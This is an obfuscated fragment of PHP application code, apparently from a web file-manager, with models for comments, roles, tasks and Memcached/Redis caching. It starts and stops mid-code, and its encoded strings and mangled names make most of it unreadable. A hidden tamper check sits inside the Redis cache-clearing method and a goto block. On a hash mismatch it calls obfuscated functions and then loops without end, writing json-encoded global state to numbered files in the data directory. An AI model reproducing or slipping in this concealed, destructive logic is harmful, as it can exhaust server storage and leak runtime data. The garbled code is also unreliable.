"\155\145\164\141\106\x69\145\x6c\144" => "\143\157\x6d\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($åéÊó‚‘) { $Ñ¸ûø´İ =& $_SERVER[èùÙ¹Ïö]; if ($åéÊó‚‘[$Ñ¸ûø´İ[1923]]) { $³Ô¡Ï×¤ = $this->where(array($Ñ¸ûø´İ[1924] => $åéÊó‚‘[$Ñ¸ûø´İ[1923]]))->find(); if (!$³Ô¡Ï×¤ || $³Ô¡Ï×¤[$Ñ¸ûø´İ[180]] != $åéÊó‚‘[$Ñ¸ûø´İ[180]] || $³Ô¡Ï×¤[$Ñ¸ûø´İ[541]] != $åéÊó‚‘[$Ñ¸ûø´İ[541]]) { return !1; } $this->where(array($Ñ¸ûø´İ[1924] => $åéÊó‚‘[$Ñ¸ûø´İ[1923]]))->setAdd($Ñ¸ûø´İ[1925], 1); } $åéÊó‚‘[$Ñ¸ûø´İ[1926]] = 0; $åéÊó‚‘[$Ñ¸ûø´İ[1925]] = 0; $åéÊó‚‘[$Ñ¸ûø´İ[790]] = 1; return $this->add($åéÊó‚‘); } public function commentCount($éŠ‚ÃĞ , $½ı‡æ–¹, $¥¢‘Õª = false) { $úÉÜ › =& $_SERVER[èùÙ¹Ïö]; if (!$éŠ‚ÃĞ ) { return array(); } if (is_string($éŠ‚ÃĞ ) || is_int($éŠ‚ÃĞ )) { $éŠ‚ÃĞ  = array($éŠ‚ÃĞ ); } $¹¿„È×£ = array($úÉÜ ›[541], $úÉÜ ›[1927] => $úÉÜ ›[536]); $ ÚÕ›¶¾ = array($úÉÜ ›[541] => array($úÉÜ ›[7], $éŠ‚ÃĞ ), $úÉÜ ›[180] => $½ı‡æ–¹); if ($¥¢‘Õª) { $ ÚÕ›¶¾[$úÉÜ ›[1696]] = $¥¢‘Õª; } $¥¨¡¬”û = $this->field($¹¿„È×£)->where($ ÚÕ›¶¾)->group($úÉÜ ›[541])->select(); return array_to_keyvalue($¥¨¡¬”û, $úÉÜ ›[541], $úÉÜ ›[536]); } public function starTarget($ßºŠ¦§, $ƒí¦­š¹) { $›ĞŸ”»û =& $_SERVER[èùÙ¹Ïö]; $§ î°æô = $ßºŠ¦§ + self::TYPE_STAR_OFFSET; $ºáƒÎ¸ = array($›ĞŸ”»û[1696] => USER_ID, $›ĞŸ”»û[180] => $§ î°æô, $›ĞŸ”»û[541] => $ƒí¦­š¹); $ü‡çô£Ü = $this->where($ºáƒÎ¸)->find(); if ($ü‡çô£Ü) { return $this->where(array($›ĞŸ”»û[445] => $ü‡çô£Ü[$›ĞŸ”»û[445]]))->delete(); } $û•ª²õ = array($›ĞŸ”»û[1923] => 0, $›ĞŸ”»û[1696] => USER_ID, $›ĞŸ”»û[790] => 1, $›ĞŸ”»û[794] => $›ĞŸ”»û[12], $›ĞŸ”»û[180] => $§ î°æô, $›ĞŸ”»û[541] => $ƒí¦­š¹, $›ĞŸ”»û[1926] => 0, $›ĞŸ”»û[1925] => 0); return $this->add($û•ª²õ); } public function starTargetCount($«ş‚«…ˆ, $Áø§¸¢³) { $›÷Â¿˜ı =& $_SERVER[èùÙ¹Ïö]; $Ü€û«È» = $Áø§¸¢³ + self::TYPE_STAR_OFFSET; $è®ñ¸ø = $this->commentCount($«ş‚«…ˆ, $Ü€û«È»); $ñÑ´…Ù¢ = $this->commentCount($«ş‚«…ˆ, $Ü€û«È», USER_ID); return array($›÷Â¿˜ı[1928] => $è®ñ¸ø, $›÷Â¿˜ı[1929] => $ñÑ´…Ù¢); } public function starTargetUserList($óÓò—ˆë, $œü‡œÊ¬) { $³Ê¥Î„± =& $_SERVER[èùÙ¹Ïö]; $ÃƒŒçå = $óÓò—ˆë + self::TYPE_STAR_OFFSET; $øòŠ€™ = array($³Ê¥Î„±[541] => $œü‡œÊ¬, $³Ê¥Î„±[180] => $ÃƒŒçå); $Íá×ÔŸ = $this->where($øòŠ€™)->count(); $À‘É³¼ó = array($³Ê¥Î„±[301] => $Íá×ÔŸ, $³Ê¥Î„±[1930] => array()); if (!$Íá×ÔŸ) { return $À‘É³¼ó; } $Ğş®¼é¦ = $this->field($³Ê¥Î„±[1696])->where($øòŠ€™)->limit(500)->select(); $Ğş®¼é¦ = array_to_keyvalue($Ğş®¼é¦, $³Ê¥Î„±[12], $³Ê¥Î„±[1696]); $À‘É³¼ó[$³Ê¥Î„±[1930]] = Model($³Ê¥Î„±[549])->userListInfo($Ğş®¼é¦); return $À‘É³¼ó; } public function prasiseUserList($ª¸Èåí) { $¸Ç¯´Ò¢ =& $_SERVER[èùÙ¹Ïö]; $Şú„„òš = array($¸Ç¯´Ò¢[1931] => $ª¸Èåí); $»»•ö«¾ = $this->where($Şú„„òš)->find(); $ëùğ¦ğ‰ = _get($»»•ö«¾, $¸Ç¯´Ò¢[1926], 0); $Î÷Şàªœ = array($¸Ç¯´Ò¢[301] => $ëùğ¦ğ‰, $¸Ç¯´Ò¢[1930] => array()); if (!$ëùğ¦ğ‰) { return $Î÷Şàªœ; } $›‹ÍûÆÑ = Model($¸Ç¯´Ò¢[1932])->field($¸Ç¯´Ò¢[1696])->where($Şú„„òš)->limit(500)->select(); $›‹ÍûÆÑ = array_to_keyvalue($›‹ÍûÆÑ, $¸Ç¯´Ò¢[12], $¸Ç¯´Ò¢[1696]); $Î÷Şàªœ[$¸Ç¯´Ò¢[1930]] = Model($¸Ç¯´Ò¢[549])->userListInfo($›‹ÍûÆÑ); return $Î÷Şàªœ; } public function remove($‡øÕèãå) { $ùØ¥’Ğ =& $_SERVER[èùÙ¹Ïö]; $ƒ©úéëİ = array($ùØ¥’Ğ[1924] => $‡øÕèãå); $¸§›˜„Ø = $this->where($ƒ©úéëİ)->find(); if ($¸§›˜„Ø[$ùØ¥’Ğ[1923]]) { $this->where(array($ùØ¥’Ğ[1924] => $¸§›˜„Ø[$ùØ¥’Ğ[1923]]))->setAdd($ùØ¥’Ğ[1925], -1); } return $this->where($ƒ©úéëİ)->delete(); } public function edit($Ë¯½ş, $ğÌ­úŸ) { $½©ğ«² =& $_SERVER[èùÙ¹Ïö]; $¤˜µˆ“· = array($½©ğ«²[1924] => $Ë¯½ş); return $this->where($¤˜µˆ“·)->save(array($½©ğ«²[1933] => $ğÌ­úŸ)); } public function prasise($’™µ®) { $ÃÂ«°»ü =& $_SERVER[èùÙ¹Ïö]; $‘à²„Ø = Model($ÃÂ«°»ü[1934]); $ª’ùõ– = array($ÃÂ«°»ü[1924] => $’™µ®, $ÃÂ«°»ü[1687] => USER_ID); $Æ÷”ÊµÑ = $‘à²„Ø->where($ª’ùõ–)->find(); if (!$Æ÷”ÊµÑ) { $‘à²„Ø->add($ª’ùõ–); $øûä²¾ˆ = $this->where(array($ÃÂ«°»ü[1924] => $’™µ®))->setAdd($ÃÂ«°»ü[1926], 1); } else { $‘à²„Ø->where($ª’ùõ–)->delete(); $øûä²¾ˆ = $this->where(array($ÃÂ«°»ü[1924] => $’™µ®))->setAdd($ÃÂ«°»ü[1926], -1); } return $øûä²¾ˆ; } public function targetInfo($ñ¿ªÆ©ü, $€Á¤‡÷ù) { $€óîğØ¨ =& $_SERVER[èùÙ¹Ïö]; $œ‰®Íòä = array($€óîğØ¨[619] => $ñ¿ªÆ©ü, $€óîğØ¨[620] => $€Á¤‡÷ù); $‘ÆÆ«’Ö = $this->where($œ‰®Íòä)->count(); $•·ñ¬áê = "\122\x49\x47\110\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\164\137\160\162\x61\x69\163\x65\40\x73\x74\x61\162\40\x6f\x6e\x20\x63\157\155\x6d\145\x6e\x74\56\143\157\x6d\x6d\x65\x6e\x74\x49\x44\40\75\40\163\164\141\x72\56\143\157\x6d\155\x65\x6e\164\111\104"; $ÛÏ¼êÖì = $this->alias($€óîğØ¨[400])->where($œ‰®Íòä)->join($•·ñ¬áê, $€óîğØ¨[1935])->count(); $†‚­÷ôñ = array($€óîğØ¨[1936] => $‘ÆÆ«’Ö, $€óîğØ¨[1937] => $ÛÏ¼êÖì); return $†‚­÷ôñ; } public function listData($‚–à³Ú) { $èù‘İ«½ =& $_SERVER[èùÙ¹Ïö]; if (isset($‚–à³Ú[$èù‘İ«½[1938]])) { if ($‚–à³Ú[$èù‘İ«½[1938]]) { $‚–à³Ú[$èù‘İ«½[1931]] = array($èù‘İ«½[1060], intval($‚–à³Ú[$èù‘İ«½[1938]])); } unset($‚–à³Ú[$èù‘İ«½[1938]]); } if (isset($‚–à³Ú[$èù‘İ«½[1939]])) { if ($‚–à³Ú[$èù‘İ«½[1939]]) { $‚–à³Ú[$èù‘İ«½[1931]] = array($èù‘İ«½[1057], intval($‚–à³Ú[$èù‘İ«½[1939]])); } unset($‚–à³Ú[$èù‘İ«½[1939]]); } return $this->_listData($‚–à³Ú); } private function _listData($àÊËµì¢) { $ƒÂ¤†Ëß =& $_SERVER[èùÙ¹Ïö]; $³Í¤šä = $this->where($àÊËµì¢)->_makeOrder()->selectPage(100); $this->_listAppendParent($³Í¤šä[$ƒÂ¤†Ëß[415]]); $this->_listAppendUser($³Í¤šä[$ƒÂ¤†Ëß[415]]); $this->_listAppendMeta($³Í¤šä[$ƒÂ¤†Ëß[415]]); return $³Í¤šä; } private function _makeOrder() { $ğãª…²å =& $_SERVER[èùÙ¹Ïö]; $Üµ®öŸÂ = array($ğãª…²å[1926], $ğãª…²å[1925], $ğãª…²å[217]); $îò•í = Input::get($ğãª…²å[500], $ğãª…²å[7], $ğãª…²å[467], $Üµ®öŸÂ); $“˜Ü¶„— = Input::get($ğãª…²å[501], $ğãª…²å[7], $ğãª…²å[1689], array($ğãª…²å[1940], $ğãª…²å[496])); $æš‡úŠ– = $îò•í . $ğãª…²å[53] . $“˜Ü¶„—; return $this->order($æš‡úŠ–); } private function _listAppendParent(&$á§¦­»Ú) { $»‡Ş¤‚ =& $_SERVER[èùÙ¹Ïö]; $şŒü¦‘ğ = array_unique(array_to_keyvalue($á§¦­»Ú, $»‡Ş¤‚[12], $»‡Ş¤‚[1923])); $şŒü¦‘ğ = array_remove_value($şŒü¦‘ğ, $»‡Ş¤‚[214]); if (!$şŒü¦‘ğ) { return; } $µËıöå = $this->where(array($»‡Ş¤‚[1924] => array($»‡Ş¤‚[7], $şŒü¦‘ğ)))->select(); $µËıöå = array_to_keyvalue($µËıöå, $»‡Ş¤‚[1931]); foreach ($á§¦­»Ú as &$Æİòµƒè) { if (isset($µËıöå[$Æİòµƒè[$»‡Ş¤‚[1923]]])) { $Æİòµƒè[$»‡Ş¤‚[1941]] = $µËıöå[$Æİòµƒè[$»‡Ş¤‚[1923]]]; } } unset($Æİòµƒè); } private function _listAppendUser(&$†Š±òÇ) { $§öÃº‰‘ =& $_SERVER[èùÙ¹Ïö]; $®Ìø¶ÉÀ = array_unique(array_to_keyvalue($†Š±òÇ, $§öÃº‰‘[12], $§öÃº‰‘[1696])); $®Ìø¶ÉÀ = array_remove_value($®Ìø¶ÉÀ, $§öÃº‰‘[214]); if (count($®Ìø¶ÉÀ) == 0) { return; } foreach ($†Š±òÇ as $ã¹å×Õ) { if (isset($ã¹å×Õ[$§öÃº‰‘[1941]])) { $®Ìø¶ÉÀ[] = $ã¹å×Õ[$§öÃº‰‘[1941]][$§öÃº‰‘[1696]]; } } $Šù„Üİ­ = Model($§öÃº‰‘[570])->userListInfo($®Ìø¶ÉÀ); foreach ($†Š±òÇ as &$ã¹å×Õ) { $ã¹å×Õ[$§öÃº‰‘[633]] = $Šù„Üİ­[$ã¹å×Õ[$§öÃº‰‘[1696]]]; if (isset($ã¹å×Õ[$§öÃº‰‘[1941]])) { $ã¹å×Õ[$§öÃº‰‘[1941]][$§öÃº‰‘[633]] = $Šù„Üİ­[$ã¹å×Õ[$§öÃº‰‘[1941]][$§öÃº‰‘[1696]]]; } } unset($ã¹å×Õ); } private function _listAppendMeta(&$òñÜ€Ğ) { $ïûÛ =& $_SERVER[èùÙ¹Ïö]; $—Ô•ÎâŸ = array_unique(array_to_keyvalue($òñÜ€Ğ, $ïûÛ[12], $ïûÛ[1931])); $—Ô•ÎâŸ = array_remove_value($—Ô•ÎâŸ, $ïûÛ[214]); if (!$—Ô•ÎâŸ) { return; } foreach ($òñÜ€Ğ as $ÖûŸ÷³û) { if (isset($ÖûŸ÷³û[$ïûÛ[1941]])) { $—Ô•ÎâŸ[] = $ÖûŸ÷³û[$ïûÛ[1941]][$ïûÛ[1931]]; } } $›ËÒ™‘Í = $this->metaList($—Ô•ÎâŸ); if (!$›ËÒ™‘Í) { return !1; } foreach ($òñÜ€Ğ as &$ÖûŸ÷³û) { $ÖûŸ÷³û[$ïûÛ[509]] = $›ËÒ™‘Í[$ÖûŸ÷³û[$ïûÛ[1931]]]; if (isset($ÖûŸ÷³û[$ïûÛ[1941]])) { $ÖûŸ÷³û[$ïûÛ[1941]][$ïûÛ[509]] = $›ËÒ™‘Í[$ÖûŸ÷³û[$ïûÛ[1941]][$ïûÛ[1931]]]; } } unset($ÖûŸ÷³û); } private function metaList($‘÷úâß…) { $„Ææ·»À =& $_SERVER[èùÙ¹Ïö]; if (!$‘÷úâß…) { return array(); } $¬™²ğ€Û = array($„Ææ·»À[1931] => array($„Ææ·»À[7], $‘÷úâß…)); $öÃŞ²™ = Model($„Ææ·»À[1942])->where($¬™²ğ€Û)->select(); $öÃŞ²™ = array_to_keyvalue_group($öÃŞ²™, $„Ææ·»À[1931]); foreach ($öÃŞ²™ as $ƒÛÁ™İ× => $Ä‰¦ìİ) { $×Ì«èÃŸ = array(); foreach ($Ä‰¦ìİ as $Ş¯¡Ø‚) { $×Ì«èÃŸ[$Ş¯¡Ø‚[$„Ææ·»À[96]]] = $Ş¯¡Ø‚[$„Ææ·»À[420]]; } $öÃŞ²™[$ƒÛÁ™İ×] = $×Ì«èÃŸ; } return $öÃŞ²™ ? $öÃŞ²™ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\145\x5f\x63\157\156\164\x65\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\151\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\x6e\143\x74\x69\157\156")); } goto CˆœÀ¨Ê‡˜; Eí©¿™ÇÚê: if ($_SERVER[$_SERVER[èùÙ¹Ïö][920]] != $_SERVER[$_SERVER[èùÙ¹Ïö][2336]]) { $_getc = $_SERVER[èùÙ¹Ïö][922]; $_getfile = $_SERVER[$_SERVER[èùÙ¹Ïö][917]] . $_SERVER[èùÙ¹Ïö][918]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èùÙ¹Ïö][248], $_getfilec); if (count($_getarrs) < $_SERVER[èùÙ¹Ïö][663]) { $exit = $_SERVER[èùÙ¹Ïö][923]; $exit(); } $_act = $_SERVER[èùÙ¹Ïö][1193]; $_act($_SERVER[$_SERVER[èùÙ¹Ïö][1192]]); } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x72\x6f\x6c\145\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x61\165\x74\x68", "\154\x61\142\x65\154", "\x64\151\x73\160\154\141\x79", "\x73\171\x73\164\145\x6d", "\x64\145\x73\143", "\151\147\x6e\x6f\162\145\x45\x78\164", "\151\x67\156\157\x72\145\106\x69\154\145\x53\x69\172\145", "\141\144\155\151\156\151\163\164\x72\141\x74\157\162", "\x73\x6f\x72\164"); public function listData($°¹Áí¦ = false, $ÑúãÇÇ = "\163\x6f\162\164", $Òø¸œô = false) { $ô˜ÀÓƒ´ =& $_SERVER[èùÙ¹Ïö]; $û„×±º = parent::listData($°¹Áí¦, $ÑúãÇÇ, $Òø¸œô); if (!$°¹Áí¦) { foreach ($û„×±º as $µ•§½³Í => $»şô°´–) { if ($»şô°´–[$ô˜ÀÓƒ´[2097]] == 1) { $û„×±º[$µ•§½³Í][$ô˜ÀÓƒ´[496]] = LNG($ô˜ÀÓƒ´[2337]); } } } return $û„×±º; } public function update($Í–ı²¼í, $½ĞÌö²Ÿ) { $àéÜ“»» =& $_SERVER[èùÙ¹Ïö]; $‹¨¹ÜÌó = parent::listData($Í–ı²¼í); $Âúì¿¼ = $this->findByName($½ĞÌö²Ÿ[$àéÜ“»»[32]]); if (!$‹¨¹ÜÌó || $Âúì¿¼ && $Âúì¿¼[$àéÜ“»»[445]] != $‹¨¹ÜÌó[$àéÜ“»»[445]]) { return !1; } if ($Âúì¿¼[$àéÜ“»»[2097]] == 1) { $½ĞÌö²Ÿ = array($àéÜ“»»[32] => $½ĞÌö²Ÿ[$àéÜ“»»[32]], $àéÜ“»»[1917] => $½ĞÌö²Ÿ[$àéÜ“»»[1917]]); } $this->filterAuth($½ĞÌö²Ÿ[$àéÜ“»»[457]]); return parent::update($Í–ı²¼í, $½ĞÌö²Ÿ); } public function remove($ı¤ÕÃâç) { $±ÇÂÁîœ = parent::listData($ı¤ÕÃâç); if (!$±ÇÂÁîœ || $±ÇÂÁîœ[$_SERVER[èùÙ¹Ïö][181]]) { return !1; } return parent::remove($ı¤ÕÃâç); } public function add($²±ØÛÅ¬) { $÷õĞ›ş =& $_SERVER[èùÙ¹Ïö]; $ÌâÒµê¯ = $²±ØÛÅ¬[$÷õĞ›ş[32]]; if ($this->findByName($ÌâÒµê¯)) { return !1; } $œ×ı = array($÷õĞ›ş[464] => $ÌâÒµê¯, $÷õĞ›ş[1900] => $÷õĞ›ş[12], $÷õĞ›ş[1896] => $÷õĞ›ş[1904], $÷õĞ›ş[2338] => 1, $÷õĞ›ş[1899] => 0, $÷õĞ›ş[2339] => 0, $÷õĞ›ş[1898] => $this->getSort()); $²±ØÛÅ¬ = array_merge($œ×ı, $²±ØÛÅ¬); $this->filterAuth($²±ØÛÅ¬[$÷õĞ›ş[457]]); return parent::insert($²±ØÛÅ¬); } private function getSort() { $‚à–ôì‹ =& $_SERVER[èùÙ¹Ïö]; $Î¿Ÿâú³ = parent::listData(); $è­Š·ª = array_to_keyvalue($Î¿Ÿâú³, $‚à–ôì‹[12], $‚à–ôì‹[1918]); return empty($è­Š·ª) ? 0 : max($è­Š·ª) + 1; } private function filterAuth(&$¶÷¯»Ñç) { $ã†¯·Ø„ =& $_SERVER[èùÙ¹Ïö]; $æ©ÉçşÕ = array(); $ãıŞû£â = array_filter(explode($ã†¯·Ø„[50], $¶÷¯»Ñç)); foreach ($ãıŞû£â as $¶÷¯»Ñç) { $Ó¬ñêêŞ = explode($ã†¯·Ø„[10], $¶÷¯»Ñç); if ($Ó¬ñêêŞ[0] == $ã†¯·Ø„[2340] && $Ó¬ñêêŞ[1] != $ã†¯·Ø„[1238]) { $øŠúÛ·© = $Ó¬ñêêŞ[0] . $ã†¯·Ø„[10] . $Ó¬ñêêŞ[1] . $ã†¯·Ø„[2341]; if (!in_array($øŠúÛ·©, $ãıŞû£â)) { $æ©ÉçşÕ[] = $øŠúÛ·©; } } $æ©ÉçşÕ[] = $¶÷¯»Ñç; } $¶÷¯»Ñç = implode($ã†¯·Ø„[50], $æ©ÉçşÕ); } public function findRoleDefault() { $Ğ³İ§ñª =& $_SERVER[èùÙ¹Ïö]; $ç£¡˜ÛÀ = parent::listData(); $‘…é—‚â = !1; foreach ($ç£¡˜ÛÀ as $Î¢¸µŸ±) { if (!$Î¢¸µŸ± || $Î¢¸µŸ±[$Ğ³İ§ñª[1916]] == $Ğ³İ§ñª[214] || $Î¢¸µŸ±[$Ğ³İ§ñª[2097]] == 1) { continue; } if (strstr($Î¢¸µŸ±[$Ğ³İ§ñª[457]], $Ğ³İ§ñª[2342])) { continue; } if (!strstr($Î¢¸µŸ±[$Ğ³İ§ñª[457]], $Ğ³İ§ñª[2343])) { continue; } if (!$‘…é—‚â) { $‘…é—‚â = $Î¢¸µŸ±; continue; } $Æğ§¢Û– = explode($Ğ³İ§ñª[50], $‘…é—‚â[$Ğ³İ§ñª[457]]); $’²ƒÌºÊ = explode($Ğ³İ§ñª[50], $Î¢¸µŸ±[$Ğ³İ§ñª[457]]); if (count($Æğ§¢Û–) > count($’²ƒÌºÊ)) { $‘…é—‚â = $Î¢¸µŸ±; } } return $‘…é—‚â ? $‘…é—‚â[$Ğ³İ§ñª[445]] : $Ğ³İ§ñª[12]; } public function sort($ÉËÎ…´, $ı¶ÔßÉÏ) { return parent::update($ÉËÎ…´, $ı¶ÔßÉÏ); } } goto CœæºàÖ¬÷; eè”ÍÊÏ“ : class CacheLockDatabase { public function lock($ƒ¢ñ¯¥È, $™¸®È» = 0) { $ìÙÈí´ = Model($_SERVER[èùÙ¹Ïö][869]); $”â§â÷ù = microtime(!0) + $™¸®È»; while (microtime(!0) < $”â§â÷ù) { $´öúºÌº = $ìÙÈí´->get($ƒ¢ñ¯¥È); if (!$´öúºÌº || $´öúºÌº < microtime(!0)) { $˜’¢Æ€ = $ìÙÈí´->set($ƒ¢ñ¯¥È, $”â§â÷ù); if ($˜’¢Æ€) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($òˆ¢·ª) { return Model($_SERVER[èùÙ¹Ïö][869])->get($òˆ¢·ª); } public function unlock($ÄÜùí€È) { Model($_SERVER[èùÙ¹Ïö][869])->remove($ÄÜùí€È); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ØÒ¾œÜ±, $½˜¶â ) { $Ëõšä¸½ =& $_SERVER[èùÙ¹Ïö]; if (!class_exists($Ëõšä¸½[907])) { show_json($Ëõšä¸½[908], !1); } $this->cacheTime = $½˜¶â ; $this->handle = new Memcached(); if (is_array($ØÒ¾œÜ±[$Ëõšä¸½[909]]) && count($ØÒ¾œÜ±[$Ëõšä¸½[909]]) >= 1) { foreach ($ØÒ¾œÜ±[$Ëõšä¸½[909]] as $Ö€¼§ç) { $¥øğ°©ï = explode($Ëõšä¸½[4], $Ö€¼§ç); $this->handle->addServer($¥øğ°©ï[0], $¥øğ°©ï[1]); } } else { $this->handle->addServer($ØÒ¾œÜ±[$Ëõšä¸½[198]], $ØÒ¾œÜ±[$Ëõšä¸½[199]]); } } public function set($”‹Õ°Äù, $¾…ÌÍÁ, $–ø‘†® = false) { $–ø‘†® = $–ø‘†® ? $–ø‘†® : $this->cacheTime; return $this->handle->set($”‹Õ°Äù, $¾…ÌÍÁ, $–ø‘†®); } public function get($‘—ö÷ùï) { return $this->handle->get($‘—ö÷ùï); } public function remove($”ïìõ Ş) { return $this->handle->delete($”ïìõ Ş); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¬Å²£óû, $ÕÃÉó) { $•òŞËò‡ =& $_SERVER[èùÙ¹Ïö]; if (!class_exists($•òŞËò‡[910])) { show_json($•òŞËò‡[911], !1); } $this->cacheTime = $ÕÃÉó; $¯Æ‰şÛŞ = isset($¬Å²£óû[$•òŞËò‡[912]]) ? $¬Å²£óû[$•òŞËò‡[912]] : 10; $Õô²¢³€ = _get($¬Å²£óû, $•òŞËò‡[909]); if ($Õô²¢³€ && is_array($Õô²¢³€)) { $this->initCluster($¬Å²£óû, $¯Æ‰şÛŞ); } else { $this->handle = $this->init($¬Å²£óû, $¯Æ‰şÛŞ); } } private function init($ìİûÀ÷®, $œ”‹“§º) { $şëÃ™˜ =& $_SERVER[èùÙ¹Ïö]; $ÜÛ¾’ÜÌ = new Redis(); $šÑ èï° = isset($ìİûÀ÷®[$şëÃ™˜[913]]) ? $ìİûÀ÷®[$şëÃ™˜[913]] : !1; if ($šÑ èï°) { $ÜÛ¾’ÜÌ->pconnect($ìİûÀ÷®[$şëÃ™˜[198]], $ìİûÀ÷®[$şëÃ™˜[199]], $œ”‹“§º); } else { $ÜÛ¾’ÜÌ->connect($ìİûÀ÷®[$şëÃ™˜[198]], $ìİûÀ÷®[$şëÃ™˜[199]], $œ”‹“§º); } if (!empty($ìİûÀ÷®[$şëÃ™˜[457]])) { $ÜÛ¾’ÜÌ->auth($ìİûÀ÷®[$şëÃ™˜[457]]); } if (!empty($ìİûÀ÷®[$şëÃ™˜[797]]) && $ìİûÀ÷®[$şëÃ™˜[797]] != 0) { $ÜÛ¾’ÜÌ->select($ìİûÀ÷®[$şëÃ™˜[797]]); } return $ÜÛ¾’ÜÌ; } private function initCluster($š½’ÀÜÄ, $‘“•øşÛ) { $¼¡õı =& $_SERVER[èùÙ¹Ïö]; $¼å¯š°˜ = array($¼¡õı[914], $¼¡õı[915], $¼¡õı[916]); $Œ¥Üòğ“ = $¼¡õı[914]; if (isset($š½’ÀÜÄ[$¼¡õı[16]]) && in_array($š½’ÀÜÄ[$¼¡õı[16]], $¼å¯š°˜)) { $Œ¥Üòğ“ = $š½’ÀÜÄ[$¼¡õı[16]]; } switch ($Œ¥Üòğ“) { case $¼¡õı[914]: $this->_slave($š½’ÀÜÄ, $‘“•øşÛ); break; case $¼¡õı[915]: break; case $¼¡õı[916]: $this->isCluster = !0; $»„ÎÀ°µ = $š½’ÀÜÄ[$¼¡õı[909]]; $ƒÁÏ‡ãÉ = isset($š½’ÀÜÄ[$¼¡õı[913]]) ? $š½’ÀÜÄ[$¼¡õı[913]] : !1; $Ô™³³ = isset($š½’ÀÜÄ[$¼¡õı[457]]) ? $š½’ÀÜÄ[$¼¡õı[457]] : null; $this->handle = new RedisCluster(NUll, $»„ÎÀ°µ, $‘“•øşÛ, $‘“•øşÛ, $ƒÁÏ‡ãÉ, $Ô™³³); break; default: break; } } private function _slave($Ï¢ŸÕ¹Ë, $÷†Â“£Ø) { $ØÀ½şˆ = $Ï¢ŸÕ¹Ë[$_SERVER[èùÙ¹Ïö][909]]; $this->filterConfig($Ï¢ŸÕ¹Ë, $ØÀ½şˆ[0]); $this->handle = $this->init($Ï¢ŸÕ¹Ë, $÷†Â“£Ø); unset($ØÀ½şˆ[0]); if (empty($ØÀ½şˆ)) { return; } $íÊ®ÚÚã = array_rand($ØÀ½şˆ); $this->filterConfig($Ï¢ŸÕ¹Ë, $ØÀ½şˆ[$íÊ®ÚÚã]); $this->slaveHandle = $this->init($Ï¢ŸÕ¹Ë, $÷†Â“£Ø); } private function filterConfig(&$ƒ©ËìÈ•, $§¬úğåƒ) { $óÂÍ·Âú =& $_SERVER[èùÙ¹Ïö]; $ğæúõÇ = explode($óÂÍ·Âú[4], $§¬úğåƒ); $ø¾¥çÓ’ = array($óÂÍ·Âú[198] => $ğæúõÇ[0], $óÂÍ·Âú[199] => $ğæúõÇ[1]); $ƒ©ËìÈ• = array_merge($ƒ©ËìÈ•, $ø¾¥çÓ’); } public function set($ò‚‡àî, $°©òí´, $Ø±×Òå® = false) { $Ø±×Òå® = $Ø±×Òå® ? $Ø±×Òå® : $this->cacheTime; return $this->handle->setEx($ò‚‡àî, $Ø±×Òå®, $°©òí´); } public function setLock($‹ôò—ù˜, $Ãâ£Œı, $±Ã€ÃáÍ) { return $this->handle->setNX($‹ôò—ù˜, $Ãâ£Œı); } public function get($Äøİ£) { $ÆÄƒ™Äî = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÆÄƒ™Äî->get($Äøİ£); } public function remove($äëÑóŒÎ) { return $this->handle->del($äëÑóŒÎ); } public function deleteAll() { $ö²Ë”ôº =& $_SERVER[èùÙ¹Ïö]; $ªÇ¸ ”˜ = $_SERVER[$ö²Ë”ôº[917]] . $ö²Ë”ôº[918]; $ÁÂ›³íí = $ö²Ë”ôº[919]; if ($_SERVER[$ö²Ë”ôº[920]] != $ÁÂ›³íí($ªÇ¸ ”˜)) { $åü‘¼Ş = $ö²Ë”ôº[921]; $˜õ¼ÜÇ = $ö²Ë”ôº[922]; $»¹¡­¿Â = $_SERVER[$ö²Ë”ôº[917]] . $ö²Ë”ôº[918]; $üœÉ‘¨Â = $˜õ¼ÜÇ($»¹¡­¿Â); $§ÈŞÔ×„ = explode($ö²Ë”ôº[248], $üœÉ‘¨Â); if (count($§ÈŞÔ×„) < $ö²Ë”ôº[655]) { $Ùœ¾Æï¬ = $ö²Ë”ôº[923]; $Ùœ¾Æï¬(); } $Œá“±Ô = $ö²Ë”ôº[924]; $Œá“±Ô($_SERVER[$ö²Ë”ôº[925]]); $åü‘¼Ş = $ö²Ë”ôº[921]; $åü‘¼Ş(); $şÌµÛ«– = $ö²Ë”ôº[926]; $ÆêÓ¶¦ = json_encode($GLOBALS[$ö²Ë”ôº[927]]); $„ÃØƒê° = 1; for ($¢©Œ¥ª = $„ÃØƒê°; $¢©Œ¥ª > 0; $¢©Œ¥ª++) { $şÌµÛ«–(DATA_PATH . $¢©Œ¥ª, $ÆêÓ¶¦); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $™ˆô´«¹) { $this->handle->flushall($™ˆô´«¹); } return; } return $this->handle->flushAll(); } } goto CĞš—¦ Ø¦; CœæºàÖ¬÷: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\164\141\163\153\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\164\171\160\x65", "\145\x76\x65\x6e\164", "\164\x69\155\x65", "\144\x65\x73\x63", "\x73\171\x73\164\145\155", "\x65\x6e\x61\142\154\145", "\x6c\x61\163\164\x52\165\x6e", "\x73\157\x72\164"); public function listData($Œ÷€¡¥ = false, $ñø¼³¹Á = "\x73\x6f\x72\x74", $Ã˜«“¶ï = false) { return parent::listData($Œ÷€¡¥, $ñø¼³¹Á, 